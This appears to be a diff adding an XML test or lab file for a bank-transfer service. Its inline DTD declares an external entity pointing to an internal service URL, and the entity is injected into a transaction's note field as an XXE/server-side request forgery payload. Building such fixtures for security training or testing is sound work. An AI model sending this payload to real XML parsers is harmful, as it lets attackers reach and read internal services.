@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE transactions [
+        <!ELEMENT fromAccountNo (#PCDATA)>
+        <!ELEMENT toAccountNo (#PCDATA)>
+        <!ELEMENT amount (#PCDATA)>
+        <!ELEMENT currency (#PCDATA)>
+        <!ELEMENT note (#PCDATA)>
+        <!ELEMENT transaction (fromAccountNo, toAccountNo, amount, currency, note)>
+        <!ELEMENT transactions (transaction*)>
+        <!ENTITY victim SYSTEM 'http://service.127.0.0.1.xip.io:9090/victim'>
+        ]>
+<transactions>
+    <transaction>
+        <fromAccountNo>1-123456-11</fromAccountNo>
+        <toAccountNo>2-123456-22</toAccountNo>
+        <amount>100</amount>
+        <currency>CHF</currency>
+        <note>&victim;</note>
+    </transaction>
+</transactions>
